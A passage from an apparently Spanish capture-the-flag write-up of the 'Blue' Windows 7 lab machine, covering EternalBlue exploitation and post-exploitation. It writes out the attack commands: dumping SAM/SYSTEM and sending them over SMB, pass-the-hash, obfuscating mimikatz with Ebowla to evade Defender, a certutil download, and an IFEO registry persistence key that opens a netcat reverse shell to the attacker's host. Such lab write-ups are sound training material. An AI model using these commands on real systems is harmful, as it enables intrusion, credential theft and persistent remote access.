+<li><p><strong>meterpreter shell o regular cmd</strong>: Visto con metasploit, con meterpreter permite hacer algunas cosas extras automátizadas, mas ejecucción en memoria…</p>
+</li>
+<li><p><strong>staged payload o stageless payload</strong>: El payload con etapas tiene la primera parte más pequeña y hace más difícil detectarlo, necesita conexión a internet para descargar el resto, mientras que el payload sin etapas va todo de golpe, puede ser más fácil de detectar. Nosotros utilizaremos este porque vamos a usar netcat para establecer la conexión y no esta preparado para múltiples fases con intercambio de información.</p>
+</li>
+</ul>
+<p>Nos ponemos por escucha con una terminal por el puerto indicado:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> rlwrap nc -nlvp 8888</span><br></pre></td></tr></table></figure></div>
+
+<p>Con rlwrap podemos realizar acciones como ctrl+L y más.</p>
+<p>Ejecutamos el <strong>eternalblue_exploit7.py</strong>:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 eternalblue_exploit7.py 10.10.244.238 shellcode/sc_x64.bin</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/whoami_en_victima.png"
+                      alt="Ejecucción del comando whoami en la máquina víctima."
+                ><figcaption>Ejecucción del comando whoami en la máquina víctima.</figcaption></figure></p>
+<p>Cómo podéis comprobar no siempre es un camino de rosas, te vas a encontrar muchas trabas, si en el exploit de python(zzz_exploit.py) visto anteriormente hubiera salido algún pipe poniendo el usuario <strong>guest</strong> tendríamos que haber modificado el script para que en lugar de escribir un archivo en C: se conectará a un recurso compartido mediante smb creado por nosotros para ejecutar un binario netcat.exe para proporcionarnos la reverse shell. Quién quiera entrar más en detalle de cómo realizar en este <a class="link"   href="https://www.youtube.com/watch?v=92XycxcAXkI" >vídeo de s4ivtar<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> lo explica, minutos 57:00-1:01:19.</p>
+<h1 id="Post-explotacion"><a href="#Post-explotacion" class="headerlink" title="Post explotación"></a>Post explotación</h1><h2 id="Activar-el-usuario-Administrator"><a href="#Activar-el-usuario-Administrator" class="headerlink" title="Activar el usuario Administrator"></a>Activar el usuario Administrator</h2><p>En está máquina tenemos desactivados el usuario Administrator, podríamos hacer lo mismo con guest, pero no nos va a hacer falta:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user Administrator /active:yes</span><br><span class="line"><span class="built_in">net</span> user Administrator Administrator</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Copia-del-archivo-SAM-y-SYSTEM"><a href="#Copia-del-archivo-SAM-y-SYSTEM" class="headerlink" title="Copia del archivo SAM y SYSTEM"></a>Copia del archivo SAM y SYSTEM</h2><ul>
+<li><p><strong>SAM</strong>(Security Account Manager): Base de datos que almacena las credenciales de los usuarios del sistema.</p>
+</li>
+<li><p><strong>SYSTEM</strong>: Parte del registro que contiene información crítica para del sistema y claves de cifrado útiles para descifrar los hashes del archivo SAM.</p>
+</li>
+</ul>
+<p>Nos podemos dirigir al directorio <strong>C:\Windows\Temp</strong>, crear una carpeta y hacer una copia de estos archivos:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save HKLM\system system.backup</span><br><span class="line">reg save HKLM\sam sam.backup</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/saves_reg_sam_system.png"
+                      alt="Copia de SAM y SYSTEM."
+                ><figcaption>Copia de SAM y SYSTEM.</figcaption></figure></p>
+<p>A continuación nos lo vamos a transferir por smb hacía nuestro equipo.</p>
+<h2 id="Enlaces-simbolicos-para-impacket"><a href="#Enlaces-simbolicos-para-impacket" class="headerlink" title="Enlaces simbólicos para impacket"></a>Enlaces simbólicos para impacket</h2><p>Para compartir recursos mediante SMB desde nuestro equipo Arch vamos a utilizar <strong>Impacket</strong>, pero en mi caso, al estar en arch y intentar ejecutar el binario me pone que no es encontrado y si esta instalado(pacman -S impacket), al parecer los binarios son almacenados sin indicar <strong>impacket-</strong> al principo como otros sistemas operativos(ej: Kali Linux) en la ruta &#x2F;usr&#x2F;bin&#x2F; Bien, pues he encontrado un <a class="link"   href="https://github.com/NoobGajen/impacket-Symbolic-link-for-Arch-Linux-as-Kali-Linux/blob/master/impacket-Symbolic-link-for-Arch-Linux-as-Kali-Linux.sh" >script realizado por NoobGajen<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> que se encarga de crear enlaces símbolicos en dicho directorio por cada paquete de impacket instalado en la misma ruta &#x2F;usr&#x2F;bin.</p>
+<p>Script:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if impacket or python-impacket-git is installed and get the package name</span></span><br><span class="line">package=$(pacman -Qs | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -E <span class="string">&#x27;^local/impacket$|^local/python-impacket-git$&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if the package variable is non-empty (i.e., a matching package is found)</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$package</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[32m<span class="subst">$(basename $package local/)</span>\033[0m package found installed in your system:)&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;Now, creating symbolic link for impacket binaries...\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the list of binaries for the package and create symbolic links</span></span><br><span class="line">    binaries=$(pacman -Ql <span class="variable">$package</span> | grep -i <span class="string">&#x27;/usr/bin/[A-Za-z0-9._-]\+&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> binary <span class="keyword">in</span> <span class="variable">$binaries</span>; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">sudo</span> <span class="built_in">ln</span> -sfv <span class="string">&quot;<span class="variable">$binary</span>&quot;</span> <span class="string">&quot;/usr/bin/impacket-<span class="subst">$(basename <span class="string">&quot;<span class="variable">$binary</span>&quot;</span> .py)</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;Impacket is not installed in your Arch Linux.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Le damos permisos de ejecucción y lanzamos.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/creacion_symbolic_links_impacket.png"
+                      alt="Creación de los links simbólicos."
+                ><figcaption>Creación de los links simbólicos.</figcaption></figure></p>
+<p>Con reiniciar la terminal o cerrarla y abrir otra ya podemos utilizarlo el comando con el formato <strong>impacket-…</strong></p>
+<h2 id="Transferencia-de-archivos-mediante-smb"><a href="#Transferencia-de-archivos-mediante-smb" class="headerlink" title="Transferencia de archivos mediante smb"></a>Transferencia de archivos mediante smb</h2><p>Utilizamos la herramienta <strong>impacket-smbserver</strong> para que la víctima nos vea y nos pueda mandar los archivos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> impacket-smbserver smbFolder $(<span class="built_in">pwd</span>) -smb2support</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><p><strong>impacket-smbserver</strong>: Herramienta que nos permite crear un servidor smb.</p>
+</li>
+<li><p><strong>smbFolder</strong>: nombre del recurso compartido.</p>
+</li>
+<li><p><strong>$(pwd)</strong>: Directorio que queremos compartir</p>
+</li>
+<li><p><strong>smb2support</strong>: Compatible para los clientes que utilicen smb2.</p>
+</li>
+</ul>
+<p>Acto consecutivo en la shell de la víctima vamos a copiar estos archivos a mi equipo mediante smb:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> sam.backup \\<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span>\smbFolder\sam</span><br><span class="line"><span class="built_in">copy</span> system.backup \\<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span>\smbFolder\system</span><br></pre></td></tr></table></figure></div>
+
+<p>Y el resultado sería el siguiente:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/mandar_sam_system_victima_atacante_via_smb.png"
+                      alt="Mandar via smb los archivos sam y system."
+                ><figcaption>Mandar via smb los archivos sam y system.</figcaption></figure><br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/recibir_sam_system_atacante_impacket_smb.png"
+                      alt="Recibir los archivos sam y system."
+                ><figcaption>Recibir los archivos sam y system.</figcaption></figure></p>
+<p>Al tener estos archivos ya en nuestro equipo podemos utilizar <strong>impacket-secretdump</strong> que nos devolverá los hashes de los usuarios:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam -system system LOCAL</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/hashes_volcados_con_impacket_secretsdump.png"
+                      alt="Obtención de hashes con impacket-secretsdump."
+                ><figcaption>Obtención de hashes con impacket-secretsdump.</figcaption></figure></p>
+<p>Estos hashes los puedes intentar de romper como hemos visto antes con metasploit, mediante crackstation, hashcat…</p>
+<h2 id="Informacion-extra-y-conexion-con-el-usuario-Administrator-mediante-Pass-The-Hash"><a href="#Informacion-extra-y-conexion-con-el-usuario-Administrator-mediante-Pass-The-Hash" class="headerlink" title="Información extra y conexión con el usuario Administrator mediante Pass The Hash"></a>Información extra y conexión con el usuario Administrator mediante Pass The Hash</h2><p>Imaginaros que la contraseña de Administrator(que la hemos puesto nosotros) es muy complicada y no conseguimos sacar el hash, podemos realizar <strong>pass the hash</strong>, está técnica consiste en conectarse utilizando el hash ntlm en lugar de la contraseña, para ello vamos a utilizar netexec(cómo crackmapexec) para comprobar si esto es posible:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec 10.10.110.244 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>-H</strong>: Hash(en este caso NTLM)</li>
+</ul>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/netexec_pass_the_hash.png"
+                      alt="Intento fallido de pass the hash."
+                ><figcaption>Intento fallido de pass the hash.</figcaption></figure></p>
+<p>Obtener hashes de contraseña almacenados en memoria, secretos como contraseñas de cuentas.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.10.91.251 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;31d6cfe0d16ae931b73c59d7e0c089c0&#x27;</span> --lsa</span><br></pre></td></tr></table></figure></div>
+
+<p>No vemos nada interesante.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/netexec_administrator_lsa_secrets.png"
+                      alt="Resultado de los secretos."
+                ><figcaption>Resultado de los secretos.</figcaption></figure></p>
+<p>Para entrar al sistema con el usuario Administrador sería:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">rlwrap impacket-psexec WORKGROUP/Administrator@10.10.145.252 -hashes :d144986c6122b1b1654ba39932465528</span><br></pre></td></tr></table></figure></div>
+
+<p>Y así podríamos entrar solo teniendo el hash.</p>
+<p>El siguiente paso es utilizar <strong>Mimikatz</strong> para intentar extraer las credenciales de Administrator de la memoria en texto claro. En una auditoría real, se puede llegar a comprometer un equipo con cuentas no privilegiadas, pero con mimikatz algunas veces se pueden ver contraseñas de usuarios privilegiados en memoria.</p>
+<h2 id="Mimikatz-y-ofuscacion-con-Ebowla-para-evadir-el-defender"><a href="#Mimikatz-y-ofuscacion-con-Ebowla-para-evadir-el-defender" class="headerlink" title="Mimikatz y ofuscación con Ebowla para evadir el defender"></a>Mimikatz y ofuscación con Ebowla para evadir el defender</h2><p>En este caso nos lo descargamos del siguiente <a class="link"   href="https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe" >repositorio<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, recuerda que tiene que ser .exe para transferirlo a la máquina víctima.</p>
+<p>Pero antes de transferir nada, tenemos que asegurarnos de que el antivirus(el defender) no nos lo casque, para ello vamos a utilizar <a class="link"   href="https://github.com/Genetic-Malware/Ebowla" >Ebowla<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> que nos ofusca el archivo y se desencripta con las variables de entorno de la víctima. Está un poco desactualizado y puede que con los nuevos antivirus o algunos más complejos no funcione, pero para este caso nos sirve.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Genetic-Malware/Ebowla</span><br><span class="line"></span><br><span class="line"><span class="comment"># Movemos el mimikatz dentro del directorio Ebowla</span></span><br><span class="line"><span class="built_in">mv</span> mimikatz.exe Ebowla</span><br></pre></td></tr></table></figure></div>
+
+<p>Nos dirigimos dentro del directorio Ebowla y abrimos el archivo <strong>genetic.config</strong>.</p>
+<p>Una vez dentro vamos a modificar los siguientes valores:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/ebowla_genetic_config_output_payload_type_modification.png"
+                      alt="Modificación de la variable output_type y payload_type."
+                ><figcaption>Modificación de la variable output_type y payload_type.</figcaption></figure></p>
+<p>Ahora vamos un poco en el script hasta que estemos en [[ENV_VAR]] que es la chicha.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/ebowla_genetic_config_env_var_vacio.png"
+                      alt="Variables de entorno por defecto."
+                ><figcaption>Variables de entorno por defecto.</figcaption></figure></p>
+<p>Hay que tener cuidado a la hora de rellenarlo, porque si nos equivocamos en alguna luego el binario no se va interpretar bien y no se podrá descrifrar correctamente.</p>
+<p>Para ir rellenándolas tendremos que ir a la consola víctima y ir viendo el valores de estas variables de entorno.</p>
+<p>Para ver las variables de entorno en windows tenemos el comando: <strong>echo %variable_entorno%</strong>, cuando no reporta nada mejor no se pone nada, es mejor que no intentéis buscarlo de otra forma porque a lo mejor no lo interpreta correctamente.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/ebowla_genetic_config_env_var_completado.png"
+                      alt="Variables de entorno rellenadas."
+                ><figcaption>Variables de entorno rellenadas.</figcaption></figure></p>
+<p>Guardamos, cerramos, instalamos las siguientes dependencias para que el script funcione:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S python2-configobj python2-pyparsing</span><br></pre></td></tr></table></figure></div>
+
+<p>Ejecutamos el script:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 ebowla.py mimikatz.exe genetic.config</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/ebowla_go_mimikatz.png"
+                      alt="Creación del archivo mimikatz con go que será compilado."
+                ><figcaption>Creación del archivo mimikatz con go que será compilado.</figcaption></figure></p>
+<p>Si vemos lo que hay en el directorio output que nos ha creado, veremos el archivo go_symmetric_mimikatz.exe.go. Tenemos el script <strong>build_x64_go.sh</strong> que se va a encargar de compilar nuestro archivo:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./build_x64_go.sh output/go_symmetric_mimikatz.exe.go mimikatz.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Al ejecutar el script vemos que algo no ha ido bien, que novedad eh, arch y sus cosas. En este caso dice lo siguiente entre otras líneas:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cgo: C compiler &quot;x86_64-w64-mingw32-gcc&quot; not found: exec: &quot;x86_64-w64-mingw32-gcc&quot;: executable file not found in $PATH</span><br></pre></td></tr></table></figure></div>
+<p>Nada pues lo instalamos <strong>sudo pacman -S mingw-w64-gcc</strong> y volvemos a ejecutar el comando:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/ebowla_script_bash_go_compila_mimikatz.png"
+                      alt="Compilación final de mimikatz."
+                ><figcaption>Compilación final de mimikatz.</figcaption></figure></p>
+<p>Bien, ya nos lo ha creado en el directorio output, vamos a transferir el archivo, en esta ocasión con un servidor en python:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 -m http.server 80</span><br></pre></td></tr></table></figure></div>
+
+<p>Y en la máquina víctima nos lo descargamos con certutil:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil.exe -f -urlcache -split http://<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span>/mimikatz.exe</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><strong>certutil.exe</strong>: Herramienta nativa de Windows que permite administrar certificados y claves criptográficas. En nuestro caso abusamos de él para descargar archivos de internet.</li>
+<li><strong>-f</strong>: Sobreescribe un archivo si ya existe.</li>
+<li><strong>-urlcache</strong>: Para descargar archivos.</li>
+<li><strong>split</strong>: Divide el archivo en muchas partes y luego lo reensambla. Útil para manejar archivos grandes o redes inestables.</li>
+</ul>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/mimikatz_in_victim_machine.png"
+                      alt="Mimikatz descargado en la máquina víctima."
+                ><figcaption>Mimikatz descargado en la máquina víctima.</figcaption></figure></p>
+<p>Si probamos a ejecutar el programa nos sale lo siguiente:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/preview_mimikatz_victim_machine.png"
+                      alt="Mimikatz en la máquina víctima."
+                ><figcaption>Mimikatz en la máquina víctima.</figcaption></figure></p>
+<p>Ahora en la consola interactiva de mimikatz ponemos lo siguiente:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>privilege::debug</strong>: Elevamos los privilegios del proceso que esta ejecutando Mimikatz. Intenta habilitar el privlegio SeDebugPrivilege en el proceso para poder inspeccionar y manipular la memoria de otros procesos.</li>
+<li><strong>sekurlsa::logonPasswords</strong>: Extrae la información de autenticación de la memoria, específicamente de LSASS(Local Security Authority Sybsystem Service). Nos puede mostrar contraseñas en texto claro, hashes NLTM, Tickets de Kerberos, información sobre sesiones de usuarios activas.</li>
+</ul>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/mimikatz_results_without_passwords.png"
+                      alt="Resultados de mimikatz sin contraseña."
+                ><figcaption>Resultados de mimikatz sin contraseña.</figcaption></figure></p>
+<p>En este caso no nos muestra credenciales en texto claro, pero podría ser que lo hiciera.</p>
+<h2 id="Informacion-extra"><a href="#Informacion-extra" class="headerlink" title="Información extra"></a>Información extra</h2><h3 id="LaZagne-Stealer-de-contrasenas"><a href="#LaZagne-Stealer-de-contrasenas" class="headerlink" title="LaZagne Stealer de contraseñas."></a>LaZagne Stealer de contraseñas.</h3><p>Dejo comentado por aquí que tenemos la herramienta <strong><a class="link"   href="https://github.com/AlessandroZ/LaZagne" >LaZagne<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> que nos permite recolectar credenciales almacenadas en nuestro equipo(navegador, gestores de contraseñas, tokens…).</p>
+<h2 id="Activacion-y-conexion-sobre-RDP"><a href="#Activacion-y-conexion-sobre-RDP" class="headerlink" title="Activación y conexión sobre RDP"></a>Activación y conexión sobre RDP</h2><p>Podemos comprobar si la máquina víctima tiene el servicio RDP disponible:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p3389 --open -v -n 10.10.145.252</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/port_rdp_nmap_scan.png"
+                      alt="Comprobación del puerto RDP."
+                ><figcaption>Comprobación del puerto RDP.</figcaption></figure></p>
+<p>Al estar cerrado tendríamos que utilizar <strong>netexec</strong> para activar el rdp en la máquina víctima:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.10.145.252 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;d144986c6122b1b1654ba39932465528&#x27;</span> -M rdp -o action=<span class="built_in">enable</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>-M rdp</strong>: Indicamos el módulo RDP.</li>
+<li><strong>-o action&#x3D;enable</strong>: -o Nos permite pasarle opciones al módulo seleccionado, en este caso que active rdp en caso de que no este.</li>
+</ul>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/active_rdp_with_netexec.png"
+                      alt="Activando rdp con netexec."
+                ><figcaption>Activando rdp con netexec.</figcaption></figure></p>
+<p>Otro tip es que ya que tenemos acceso al equipo víctima, podemos comprobar si dicho puerto se ha abierto con el comando:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -na</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>-n</strong>: Muestra las direcciones ip y los números de puerto en formato numérico. Sin está opción también intentaría resolver el nombre de los host y tardaría más tiempo.</li>
+<li><strong>-a</strong>: Muestra todas las conexiones y puertos activos.</li>
+</ul>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/netstat_open_port.png"
+                      alt="Comprobación del estado del puerto rdp en la máquina víctima."
+                ><figcaption>Comprobación del estado del puerto rdp en la máquina víctima.</figcaption></figure></p>
+<p>Ejecucción de la conexión para obtener el escritorio:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop 10.10.145.252 -u <span class="string">&#x27;Administrator&#x27;</span> -p <span class="string">&#x27;no_la_tengo&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Si no tienes la contraseña puedes usar <strong>xfreerdp</strong> para usar pass the hash, en arch tienes que instalar el paquete AUR:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S freerdp2</span><br></pre></td></tr></table></figure></div>
+
+<p>Después ya lo puedes ejecutar con <strong>xfreerdp</strong>:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.10.202.55 /u:Administrator /pth:d144986c6122b1b1654ba39932465528 /sec:rdp</span><br></pre></td></tr></table></figure></div>
+
+<p>En W7 no podemos aplicar pass the hash porque necesitamos tener el modo restricted Admin Mode activado, esto solo es posible a partir del Windows 8.1, lo podemos ver en la ayuda del comando xfreerdp si aún así quieres intentarlo verás que no se conecta al usuario Administrator, si no que tienes que introducir la contraseña:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/hash_the_pass_rdp_w7_not_allowed.png"
+                      alt="Hash the pass en Windows 7 no permitido."
+                ><figcaption>Hash the pass en Windows 7 no permitido.</figcaption></figure></p>
+<p>Así que tenemos que seguir buscando una manera para buscar la contraseña sin llegar a descifrar el hash.</p>
+<p>Lo que podemos hacer es entrar mediante RDP(ya que la contraseña se la hemos establecido nosotros) con las credenciales Administrator&#x2F;Administrator, <strong>simulando la conexión de un tercero</strong>. Una vez realizado esto realizamos las mismas operaciones con mimikatz y vemos si aparece algo más de información.</p>
+<p>La idea es ejecutar los comandos del mimikatz una vez conectado por RDP(en mi caso lo he realizado mientras está la conexión activa)</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/conexion_mediante_rdp_sabiendo_la_contrase%C3%B1a.png"
+                      alt="Conexión simulando un tercero."
+                ><figcaption>Conexión simulando un tercero.</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/mimikatz_con_credenciales_administrator.png"
+                      alt="Mimikatz con las credenciales del administrador en texto claro."
+                ><figcaption>Mimikatz con las credenciales del administrador en texto claro.</figcaption></figure></p>
+<p>Genial, ahora si podemos ver la contraseña en texto claro, hashes…En caso de ser una contraseña compleja os la podríais encontrar mediante mimikatz y ser de gran ayuda.</p>
+<h1 id="Persistencia"><a href="#Persistencia" class="headerlink" title="Persistencia"></a>Persistencia</h1><h2 id="1-Cuando-se-abre-una-aplicacion-que-nos-de-una-shell"><a href="#1-Cuando-se-abre-una-aplicacion-que-nos-de-una-shell" class="headerlink" title="1. Cuando se abre una aplicación que nos de una shell."></a>1. Cuando se abre una aplicación que nos de una shell.</h2><p>Cada vez que se abra el explorador de archivos vamos a obtener una shell, lo primero es buscar el binario o nombre de este:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Windows\system32</span><br><span class="line"><span class="built_in">dir</span> | <span class="built_in">find</span> &quot;explore&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/encontrado_el_binario_del_explorador_de_archivos.png"
+                      alt="Binario del explorador de archivos."
+                ><figcaption>Binario del explorador de archivos.</figcaption></figure></p>
+<p>Una vez localizado(explorer.exe) debemos realizar una copia:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> explorer.exe _explorer.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Debemos de subir un binario netcat, para que pueda enviarnos la shell:</p>
+<p>Nos lo descargamos en nuestro máquina atacante, en mi caso utilice este <a class="link"   href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe" >repositorio<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> y una vez traido a mi máquina lo renombre como nc.exe.</p>
+<p>Nos movemos a la carpeta creada en temp aunque no haría falta porque somos Administradores, pero al estar ya creada.</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Windows\Temp\postExplotacion</span><br></pre></td></tr></table></figure></div>
+
+<p>Y de la misma forma que nos descargamos mimikatz lo hacemos con nc, en este caso no vamos a utilizar ebowla porque el firewall no lo detecta y no hace falta.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 -m http.server 80</span><br><span class="line">certutil -f -urlcache -<span class="built_in">split</span> http://10.21.60.116/nc.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Una vez descargado vamos a añadir el siguiente registro:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe&quot; /v Debugger /t reg_sz /d &quot;<span class="built_in">cmd</span> /C _explorer.exe &amp; C:\Windows\Temp\postExplotacion\nc.exe -e <span class="built_in">cmd</span> <span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span> <span class="number">443</span>&quot; /f </span><br></pre></td></tr></table></figure></div>
+
+<p>En caso de equivocarte con algo para eliminarlo sería así:</p>
